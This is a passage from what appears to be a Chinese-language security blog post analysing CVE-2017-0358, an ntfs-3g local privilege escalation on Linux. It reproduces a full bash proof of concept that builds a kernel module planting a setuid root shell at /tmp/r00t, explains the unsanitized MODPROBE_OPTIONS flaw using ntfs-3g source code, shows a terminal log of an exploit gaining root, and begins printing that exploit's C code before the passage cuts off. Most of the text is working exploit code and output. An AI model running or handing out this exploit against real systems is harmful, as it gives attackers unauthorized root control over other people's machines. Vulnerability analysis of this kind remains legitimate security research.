class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  ntfs-3g local privilege escalation to root     @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Credits to Google Project Zero                 @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Tested: Debian 9 (Stretch)                     @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Date: 2017-02-03                               @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Link: https://goo.gl/A9I8Vq                    @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Gathering environment info ..."</span></span><br><span class="line">cwd=<span class="string">"<span class="variable">$(pwd)</span>"</span></span><br><span class="line">un=<span class="string">"<span class="variable">$(uname -r)</span>"</span></span><br><span class="line">dlm=<span class="string">"<span class="variable">$(pwd)</span>/lib/modules"</span></span><br><span class="line">dkf=<span class="string">"<span class="variable">$(pwd)</span>/kernel/fs"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Creating kernel hijack directories ..."</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$&#123;dlm&#125;</span>"</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$&#123;dkf&#125;</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Forging symlinks ..."</span></span><br><span class="line">ln -sf <span class="string">"<span class="variable">$&#123;cwd&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dlm&#125;</span>/<span class="variable">$&#123;un&#125;</span>"</span></span><br><span class="line">ln -sf <span class="string">"<span class="variable">$&#123;cwd&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dkf&#125;</span>/fuse"</span></span><br><span class="line">ln -sf cve_2017_0358.ko fuse.ko</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Pulling in deps ... "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Building kernel module ... "</span></span><br><span class="line"> </span><br><span class="line">cat &lt;&lt; <span class="string">'EOF'</span> &gt; cve_2017_0358.c</span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">"CC"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"kristian erik hermansen &lt;kristian.hermansen+CVE-2017-0358@gmail.com&gt;"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"PoC for CVE-2017-0358 from Google Project Zero"</span>);</span><br><span class="line"> </span><br><span class="line">int init_module(void) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n"</span>);</span><br><span class="line">  char *envp[] = &#123; <span class="string">"HOME=/tmp"</span>, NULL &#125;;</span><br><span class="line">  char *argv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t"</span>, NULL &#125;;</span><br><span class="line">  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">  char *argvv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/sbin/rmmod cve_2017_0358"</span>, NULL &#125;;</span><br><span class="line">  call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void cleanup_module(void) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"[*] CVE-2017-0358 exploit unloading ...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"> </span><br><span class="line">cat &lt;&lt; <span class="string">'EOF'</span> &gt; Makefile</span><br><span class="line">obj-m += cve_2017_0358.o</span><br><span class="line"> </span><br><span class="line">all:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</span><br><span class="line"> </span><br><span class="line">clean:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</span><br><span class="line">EOF</span><br><span class="line"> </span><br><span class="line">make 1&gt;/dev/null 2&gt;/dev/null || <span class="built_in">echo</span> <span class="string">"[-] FAILED: your need make / build tools"</span></span><br><span class="line">cp <span class="string">"/lib/modules/<span class="variable">$&#123;un&#125;</span>/modules.dep.bin"</span> . || <span class="built_in">echo</span> <span class="string">"[-] FAILED: linux-image location non-default?"</span></span><br><span class="line">MODPROBE_OPTIONS=<span class="string">"-v -d <span class="variable">$&#123;cwd&#125;</span>"</span> ntfs-3g /dev/null /dev/null 1&gt;/dev/null 2&gt;/dev/null</span><br><span class="line">/tmp/r00t -c <span class="string">'whoami'</span> | egrep -q <span class="string">'root'</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">"[+] SUCCESS: You have root. Don't be evil :)"</span></span><br><span class="line">/tmp/r00t</span><br></pre></td></tr></table></figure><p>　　疑惑的是无论如何测试，始终不成功，最后怀疑是<code>modprobe</code>函数的问题，查看<a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/sec-Setting_Module_Parameters.html" target="_blank" rel="noopener">官方文档</a>，给出如下解释：</p><blockquote><p><strong>The modprobe command silently succeeds with an exit status of 0 if it successfully loads the module, or the module is already loaded into the kernel.Thus, you must ensure that the module is not already loaded before attempting to load it with custom parameters. The modprobe command does not automatically reload the module, or alert you that it is already loaded.</strong></p></blockquote><p> 　　也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：<strong>“need additional modification，you have to make me an offer”</strong>,shit…</p><p>（注：jannh已在<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>上发布有效版本，<a href="https://www.exploit-db.com/exploits/41356/" target="_blank" rel="noopener">ntfs-3g - Unsanitized modprobe Environment Privilege Escalation</a>）</p><h2 id="0x01-ntfs-3g-modprobe-is-executed-with-unsanitized-environment"><a href="#0x01-ntfs-3g-modprobe-is-executed-with-unsanitized-environment" class="headerlink" title="0x01 ntfs-3g: modprobe is executed with unsanitized environment"></a>0x01 ntfs-3g: modprobe is executed with unsanitized environment</h2><hr><p>　　在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1072" target="_blank" rel="noopener">(ntfs-3g: modprobe is executed with unsanitized environment)</a>。</p><p>　　漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用<code>modprobe</code>时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于<code>load_fuse_module ()</code>函数之中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> fuse_fstype <span class="title">load_fuse_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="keyword">pid_t</span> pid;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *cmd = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">req</span> = &#123;</span> <span class="number">0</span>, <span class="number">100000000</span> &#125;;   <span class="comment">/* 100 msec */</span></span><br><span class="line">   fuse_fstype fstype;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123;</span><br><span class="line">       pid = fork();</span><br><span class="line">       <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">           execl(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>);</span><br><span class="line">           _exit(<span class="number">1</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>)</span><br><span class="line">           waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * We sleep first because despite the detection of the loaded</span></span><br><span class="line"><span class="comment">        * FUSE kernel module, fuse_mount() can still fail if it's not</span></span><br><span class="line"><span class="comment">        * fully functional/initialized. Note, of course this is still</span></span><br><span class="line"><span class="comment">        * unreliable but usually helps.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       nanosleep(&amp;req, <span class="literal">NULL</span>);</span><br><span class="line">       fstype = get_fuse_fstype();</span><br><span class="line">       <span class="keyword">if</span> (fstype != FSTYPE_NONE)</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> fstype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 　　当NTFS-3G被调用时，利用<code>get_fuse_fstype()</code>检测当前系统是否加载FUSE模块，若未加载，则利用<code>load_fuse_module()</code>中的<code>modprobe</code>，加载FUSE模块。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> fuse_fstype <span class="title">get_fuse_fstype</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fuse_fstype fstype = FSTYPE_NONE;</span><br><span class="line"></span><br><span class="line">    FILE *f = fopen(<span class="string">"/proc/filesystems"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        ntfs_log_perror(<span class="string">"Failed to open /proc/filesystems"</span>);</span><br><span class="line">        <span class="keyword">return</span> FSTYPE_UNKNOWN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), f)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"fuseblk\n"</span>)) &#123;</span><br><span class="line">            fstype = FSTYPE_FUSEBLK;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"fuse\n"</span>))</span><br><span class="line">            fstype = FSTYPE_FUSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> fstype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　问题在于，<code>modprobe</code>的设计初衷并不是运行在一个setuid的环境当中，而NTFS-3G却需要setuid的权限。在<code>modprobe</code>的man文档中明确指出：</p><blockquote><p><strong>The MODPROBE_OPTIONS environment variable can also be used to pass arguments to modprobe.</strong></p></blockquote><p>　　因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量<strong>MODPROBE_OPTIONS “-C /tmp/evil_config -d /tmp/evil_root”</strong>，强制<code>modprobe</code>加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。</p><p>　　在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。 jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在<code>fopen(&quot;/proc/filesystems&quot;, &quot;r&quot;)</code>时异常，导致<code>get_fuse_fstype()</code>返回<strong>FSTYPE_UNKNOWN</strong>，在主函数中触发<code>load_fuse_module()</code>函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fstype = get_fuse_fstype();</span><br><span class="line"></span><br><span class="line">err = NTFS_VOLUME_NO_PRIVILEGE;</span><br><span class="line"><span class="keyword">if</span> (restore_privs())</span><br><span class="line">    <span class="keyword">goto</span> err_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN)</span><br><span class="line">    fstype = load_fuse_module();</span><br><span class="line">create_dev_fuse();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drop_privs())</span><br><span class="line">    <span class="keyword">goto</span> err_out;</span><br></pre></td></tr></table></figure><h2 id="0x02-Attack"><a href="#0x02-Attack" class="headerlink" title="0x02 Attack"></a>0x02 Attack</h2><p>　　jannh给出了<a href="https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/41356.zip" target="_blank" rel="noopener">EXP</a>，通过测试成功在Ubuntu Server 16.10、kali 4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.tar</span><br><span class="line"></span><br><span class="line">user@ubuntu:~$ <span class="built_in">cd</span> ntfs-3g-modprobe-unsafe/</span><br><span class="line"></span><br><span class="line">user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.sh</span><br><span class="line"></span><br><span class="line">make: Entering directory <span class="string">'/usr/src/linux-headers-4.8.0-32-generic'</span></span><br><span class="line"></span><br><span class="line">  CC [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.o</span><br><span class="line"></span><br><span class="line">  Building modules, stage 2.</span><br><span class="line"></span><br><span class="line">  MODPOST 1 modules</span><br><span class="line"></span><br><span class="line">  CC      /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o</span><br><span class="line"></span><br><span class="line">  LD [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.ko</span><br><span class="line"></span><br><span class="line">make: Leaving directory <span class="string">'/usr/src/linux-headers-4.8.0-32-generic'</span></span><br><span class="line"></span><br><span class="line">depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directory</span><br><span class="line"></span><br><span class="line">depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directory</span><br><span class="line"></span><br><span class="line">user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploit</span><br><span class="line"></span><br><span class="line">looks like we won the race</span><br><span class="line"></span><br><span class="line">got ENFILE at 198088 total</span><br><span class="line"></span><br><span class="line">Failed to open /proc/filesystems: Too many open files <span class="keyword">in</span> system</span><br><span class="line"></span><br><span class="line">  yay, modprobe ran!</span><br><span class="line"></span><br><span class="line">modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open <span class="built_in">builtin</span> file <span class="string">'/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'</span></span><br><span class="line"></span><br><span class="line">modprobe: ERROR: could not insert <span class="string">'rootmod'</span>: Too many levels of symbolic links</span><br><span class="line"></span><br><span class="line">Error opening <span class="string">'/tmp/ntfs_sploit.u48sGO/volume'</span>: Is a directory</span><br><span class="line"></span><br><span class="line">Failed to mount <span class="string">'/tmp/ntfs_sploit.u48sGO/volume'</span>: Is a directory</span><br><span class="line"></span><br><span class="line">we have root privs now...</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/ntfs-3g-modprobe-unsafe<span class="comment"># id</span></span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user)</span><br></pre></td></tr></table></figure><h2 id="0x03-Code-Exploit-c"><a href="#0x03-Code-Exploit-c" class="headerlink" title="0x03 Code: Exploit.c"></a>0x03 Code: Exploit.c</h2><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* prevent shell from backgrounding ntfs-3g when stopped */</span></span><br><span class="line"><span class="keyword">pid_t</span> initial_fork_child = fork();</span><br><span class="line"><span class="keyword">if</span> (initial_fork_child == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"initial fork"</span>);</span><br><span class="line"><span class="keyword">if</span> (initial_fork_child != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (waitpid(initial_fork_child, &amp;status, <span class="number">0</span>) != initial_fork_child)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"waitpid"</span>);</span><br><span class="line">    execl(<span class="string">"rootshell"</span>, <span class="string">"rootshell"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// Set up workspace with volume, mountpoint, modprobe config and module directory.</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">template</span>[] = <span class="string">"/tmp/ntfs_sploit.XXXXXX"</span>;</span><br><span class="line"><span class="keyword">if</span> (mkdtemp(<span class="keyword">template</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mkdtemp"</span>);</span><br><span class="line"><span class="keyword">char</span> volume[<span class="number">100</span>], mountpoint[<span class="number">100</span>], modprobe_confdir[<span class="number">100</span>], modprobe_conffile[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(volume, <span class="string">"%s/volume"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(mountpoint, <span class="string">"%s/mountpoint"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_confdir, <span class="string">"%s/modprobe.d"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_conffile, <span class="string">"%s/sploit.conf"</span>, modprobe_confdir);</span><br><span class="line"><span class="keyword">if</span> (mkdir(volume, <span class="number">0777</span>) || mkdir(mountpoint, <span class="number">0777</span>) || mkdir(modprobe_confdir, <span class="number">0777</span>))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mkdir"</span>);</span><br><span class="line"><span class="keyword">int</span> conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, <span class="number">0666</span>);</span><br><span class="line"><span class="keyword">if</span> (conffd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"open modprobe config"</span>);</span><br><span class="line"><span class="keyword">int</span> suidfile_fd = open(<span class="string">"rootshell"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (suidfile_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to open ./rootshell"</span>);</span><br><span class="line"><span class="keyword">char</span> modprobe_config[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_config, <span class="string">"alias fuse rootmod\noptions rootmod suidfile_fd=%d\n"</span>, suidfile_fd);</span><br><span class="line"><span class="keyword">if</span> (write(conffd, modprobe_config, <span class="built_in">strlen</span>(modprobe_config)) != <span class="built_in">strlen</span>(modprobe_config))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"modprobe config write failed"</span>);</span><br><span class="line">close(conffd);</span><br><span class="line"><span class="comment">// module directory setup</span></span><br><span class="line"><span class="keyword">char</span> system_cmd[<span class="number">1000</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(system_cmd, <span class="string">"mkdir -p %s/lib/modules/$(uname -r) &amp;&amp; cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/"</span>,</span><br><span class="line">    <span class="keyword">template</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="keyword">if</span> (system(system_cmd))</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"shell command failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /proc/mounts.</span></span><br><span class="line"><span class="comment">// Note: /proc/mounts is a symlink to /proc/self/mounts, so</span></span><br><span class="line"><span class="comment">// the watch will only see accesses by this process.</span></span><br><span class="line"><span class="keyword">int</span> inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(inotify_fd, <span class="string">"/proc/mounts"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /proc/mounts"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /proc/filesystems.</span></span><br><span class="line"><span class="comment">// This can be used to detect whether we lost the race.</span></span><br><span class="line"><span class="keyword">int</span> fs_inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fs_inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(fs_inotify_fd, <span class="string">"/proc/filesystems"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    